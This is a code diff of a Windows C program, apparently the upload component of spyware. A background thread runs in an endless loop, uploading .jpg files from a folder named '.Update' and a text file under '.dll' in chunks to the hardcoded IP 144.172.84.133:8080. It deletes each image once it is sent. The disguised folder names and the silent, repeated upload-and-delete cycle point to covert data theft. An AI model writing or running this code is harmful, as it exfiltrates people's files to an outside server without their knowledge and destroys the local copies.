@@ -1,229 +1,137 @@
+#include <windows.h>
+#include <wininet.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <windows.h>
-#include <winhttp.h>
-#include <time.h>
-#include <direct.h>
-#include <pthread.h>  // Pour les threads
 
-#pragma comment(lib, "winhttp.lib")
+#define SERVER      "144.172.84.133"
+#define PORT        8080
+#define MAX_CHUNK   (1024 * 1024)  // 1 MB
+#define WAIT_TIME   10             // seconds between cycles
 
-#define SERVER_URL      L"144.172.84.133"  // Remplace par l'adresse de ton serveur
-#define SERVER_PORT     8080  // Port du serveur principal pour les .png
-#define SERVER_PATH     L"/"
-#define DEDICATED_PORT  8081  // Port du serveur dédié pour les .txt
-#define CHUNK_SIZE      (1024 * 1024)  // Taille de chaque segment (1MB)
-#define MAX_PNG_SENDS   5  // Nombre d'envois de .png avant d'envoyer le .txt
-#define WAIT_TIME       10  // Temps d'attente entre chaque cycle d'envoi (en secondes)
+#pragma comment(lib, "wininet.lib")
 
-// Fonction pour envoyer les fichiers .png
-void send_png(const wchar_t* filepath) {
-    FILE* fp = _wfopen(filepath, L"rb");
-    if (!fp) return;
+// Envoie un fichier découpé en segments selon le protocole HTTP
+int send_file_in_chunks(const char* file_path, const char* file_type) {
+    FILE* fp = fopen(file_path, "rb");
+    if (!fp) return 0;
 
     fseek(fp, 0, SEEK_END);
-    size_t filesize = ftell(fp);
-    fseek(fp, 0, SEEK_SET);
+    long size = ftell(fp);
+    rewind(fp);
 
-    size_t total_chunks = (filesize + CHUNK_SIZE - 1) / CHUNK_SIZE;
-    wchar_t* filename = wcsrchr(filepath, L'\\');
-    if (!filename) filename = (wchar_t*)filepath;
-    else filename++;
+    unsigned char* buffer = (unsigned char*)malloc(size);
+    if (!buffer) { fclose(fp); return 0; }
 
-    BYTE* buffer = malloc(CHUNK_SIZE);
-    if (!buffer) {
-        fclose(fp);
-        return;
-    }
-
-    HINTERNET hSession = WinHttpOpen(L"SenderApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_URL, SERVER_PORT, 0);
-
-    for (size_t i = 0; i < total_chunks; i++) {
-        DWORD to_read = CHUNK_SIZE;
-        if ((i + 1) * CHUNK_SIZE > filesize)
-            to_read = filesize - i * CHUNK_SIZE;
-
-        fread(buffer, 1, to_read, fp);
-
-        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH,
-                                NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-
-        wchar_t seg_header[64], total_header[64];
-        wchar_t headers[512];
-        swprintf(seg_header, 64, L"%d", (int)i);
-        swprintf(total_header, 64, L"%d", (int)total_chunks);
-        swprintf(headers, 512,
-            L"X-Filename: %s\r\n"
-            L"X-File-Type: png\r\n"
-            L"X-Segment-Number: %s\r\n"
-            L"X-Total-Segments: %s\r\n",
-            filename, seg_header, total_header);
-
-        WinHttpAddRequestHeaders(hRequest, headers, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
-        BOOL res = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                      buffer, to_read, to_read, 0);
-        if (res) WinHttpReceiveResponse(hRequest, NULL);
-        else wprintf(L"Erreur HTTP: %s (%d)\n", filename, i);
-
-        WinHttpCloseHandle(hRequest);
-        Sleep(2);  // Pause douce pour éviter un envoi trop rapide
-    }
-
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    fread(buffer, 1, size, fp);
     fclose(fp);
-    free(buffer);
 
-    _wremove(filepath);
-    wprintf(L"Fichier supprimé: %s\n", filepath);
-}
+    int total_chunks = (int)((size + MAX_CHUNK - 1) / MAX_CHUNK);
+    const char* filename = strrchr(file_path, '\\');
+    if (filename) filename++;
+    else filename = file_path;
 
-// Fonction pour envoyer le fichier .txt au serveur dédié
-void send_txt(const wchar_t* filepath) {
-    FILE* fp = _wfopen(filepath, L"rb");
-    if (!fp) return;
+    HINTERNET hInternet = InternetOpenA("Uploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) { free(buffer); return 0; }
 
-    fseek(fp, 0, SEEK_END);
-    size_t filesize = ftell(fp);
-    fseek(fp, 0, SEEK_SET);
-
-    size_t total_chunks = (filesize + CHUNK_SIZE - 1) / CHUNK_SIZE;
-    wchar_t* filename = wcsrchr(filepath, L'\\');
-    if (!filename) filename = (wchar_t*)filepath;
-    else filename++;
-
-    BYTE* buffer = malloc(CHUNK_SIZE);
-    if (!buffer) {
-        fclose(fp);
-        return;
-    }
-
-    HINTERNET hSession = WinHttpOpen(L"SenderApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_URL, DEDICATED_PORT, 0);
-
-    for (size_t i = 0; i < total_chunks; i++) {
-        DWORD to_read = CHUNK_SIZE;
-        if ((i + 1) * CHUNK_SIZE > filesize)
-            to_read = filesize - i * CHUNK_SIZE;
-
-        fread(buffer, 1, to_read, fp);
-
-        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH,
-                                NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-
-        wchar_t seg_header[64], total_header[64];
-        wchar_t headers[512];
-        swprintf(seg_header, 64, L"%d", (int)i);
-        swprintf(total_header, 64, L"%d", (int)total_chunks);
-        swprintf(headers, 512,
-            L"X-Filename: %s\r\n"
-            L"X-File-Type: output_text\r\n"
-            L"X-Segment-Number: %s\r\n"
-            L"X-Total-Segments: %s\r\n",
-            filename, seg_header, total_header);
-
-        WinHttpAddRequestHeaders(hRequest, headers, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
-        BOOL res = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                      buffer, to_read, to_read, 0);
-        if (res) WinHttpReceiveResponse(hRequest, NULL);
-        else wprintf(L"Erreur HTTP: %s (%d)\n", filename, i);
-
-        WinHttpCloseHandle(hRequest);
-        Sleep(2);  // Pause douce pour éviter un envoi trop rapide
-    }
-
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-    fclose(fp);
-    free(buffer);
-
-    _wremove(filepath);
-    wprintf(L"Fichier supprimé: %s\n", filepath);
-}
-
-// Fonction pour obtenir les fichiers PNG dans un dossier
-int get_png_files(const wchar_t* folder_path, wchar_t*** files, int* file_count) {
-    WIN32_FIND_DATAW findFileData;
-    HANDLE hFind = FindFirstFileW(folder_path, &findFileData);
-    if (hFind == INVALID_HANDLE_VALUE) {
-        return 0;  // Aucun fichier trouvé
-    }
-
-    // Compte les fichiers .png dans le dossier
-    int count = 0;
-    do {
-        if (wcsstr(findFileData.cFileName, L".png")) {
-            count++;
-        }
-    } while (FindNextFileW(hFind, &findFileData) != 0);
-    FindClose(hFind);
-
-    // Alloue de la mémoire pour les fichiers
-    *files = (wchar_t**)malloc(count * sizeof(wchar_t*));
-    if (*files == NULL) {
+    HINTERNET hConnect = InternetConnectA(hInternet, SERVER, PORT, NULL, NULL,
+                                          INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        free(buffer);
         return 0;
     }
 
-    // Remet à zéro le compteur
-    *file_count = 0;
+    for (int i = 0; i < total_chunks; i++) {
+        DWORD chunk_size = ((i + 1) * MAX_CHUNK < size) ? MAX_CHUNK : size - i * MAX_CHUNK;
 
-    // Recherche et récupère les fichiers .png
-    hFind = FindFirstFileW(folder_path, &findFileData);
-    if (hFind == INVALID_HANDLE_VALUE) {
-        return 0;
+        char headers[512];
+        int hdr_len = snprintf(headers, sizeof(headers),
+            "X-Filename: %s\r\n"
+            "X-File-Type: %s\r\n"
+            "X-Segment-Number: %d\r\n"
+            "X-Total-Segments: %d\r\n",
+            filename, file_type, i, total_chunks);
+        if (hdr_len < 0) hdr_len = 0;
+
+        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL,
+                                             NULL, NULL,
+                                             INTERNET_FLAG_RELOAD |
+                                             INTERNET_FLAG_NO_CACHE_WRITE, 0);
+        if (!hRequest) break;
+
+        HttpSendRequestA(hRequest, headers, hdr_len,
+                         buffer + (i * MAX_CHUNK), chunk_size);
+        InternetCloseHandle(hRequest);
+
+        Sleep(50);  // Petite pause
     }
 
-    while (FindNextFileW(hFind, &findFileData) != 0) {
-        if (wcsstr(findFileData.cFileName, L".png")) {
-            (*files)[*file_count] = _wcsdup(findFileData.cFileName);
-            (*file_count)++;
-        }
-    }
-
-    FindClose(hFind);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+    free(buffer);
     return 1;
 }
 
-// Fonction exécutée dans un thread pour envoyer les fichiers .png et .txt
-DWORD WINAPI process_files(void* arg) {
-    int png_send_count = 0;
-    wchar_t* txt_filepath = L".dll\\file_to_send.txt";
+// Récupère la liste des fichiers .jpg dans le dossier .Update
+void get_jpg_files(const char* folder_path, char*** out_files, int* count) {
+    char search_path[MAX_PATH];
+    snprintf(search_path, sizeof(search_path), "%s\\*.jpg", folder_path);
+
+    WIN32_FIND_DATAA findData;
+    HANDLE hFind = FindFirstFileA(search_path, &findData);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        *count = 0;
+        *out_files = NULL;
+        return;
+    }
+
+    char** list = NULL;
+    int idx = 0;
+    do {
+        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            char full_path[MAX_PATH];
+            snprintf(full_path, sizeof(full_path), "%s\\%s", folder_path, findData.cFileName);
+            char* copy = _strdup(full_path);
+            list = (char**)realloc(list, sizeof(char*) * (idx + 1));
+            list[idx++] = copy;
+        }
+    } while (FindNextFileA(hFind, &findData));
+
+    FindClose(hFind);
+    *count = idx;
+    *out_files = list;
+}
+
+// Thread principal : envoie chaque jpg puis le fichier texte associé
+DWORD WINAPI process_files(LPVOID arg) {
+    const char* folder_path = ".Update";
+    const char* txt_path     = ".dll\\text.txt";
 
     while (1) {
-        wchar_t* folder_path = L"Update";
-        wchar_t** png_files = NULL;
-        int png_file_count = 0;
+        char** jpg_files = NULL;
+        int jpg_count = 0;
 
-        // Récupérer les fichiers .png dans le dossier Update
-        get_png_files(folder_path, &png_files, &png_file_count);
-
-        // Si aucun fichier .png trouvé, on attend
-        if (png_file_count == 0) {
-            wprintf(L"Aucun fichier .png trouvé dans %s. Attente...\n", folder_path);
-            Sleep(WAIT_TIME * 1000);  // Attendre X secondes avant de recommencer
+        get_jpg_files(folder_path, &jpg_files, &jpg_count);
+        if (jpg_count == 0) {
+            printf("Aucun .jpg dans %s. Attente...\n", folder_path);
+            Sleep(WAIT_TIME * 1000);
             continue;
         }
 
-        // Envoyer les fichiers .png
-        for (int i = 0; i < png_file_count && png_send_count < MAX_PNG_SENDS; i++) {
-            send_png(png_files[i]);
-            free(png_files[i]);
+        for (int i = 0; i < jpg_count; i++) {
+            if (send_file_in_chunks(jpg_files[i], ".Update")) {
+                remove(jpg_files[i]);
+            }
+            free(jpg_files[i]);
+
+            // Après chaque envoi de jpg, envoie le .txt
+            send_file_in_chunks(txt_path, ".dll");
         }
 
-        png_send_count++;
-        free(png_files);
-
-        // Si 5 envois de .png effectués, envoyer le .txt
-        if (png_send_count >= MAX_PNG_SENDS) {
-            send_txt(txt_filepath);
-            png_send_count = 0;  // Réinitialiser le compteur
-        }
-
-        // Attendre avant de répéter
+        free(jpg_files);
         Sleep(WAIT_TIME * 1000);
     }
-
     return 0;
 }
+
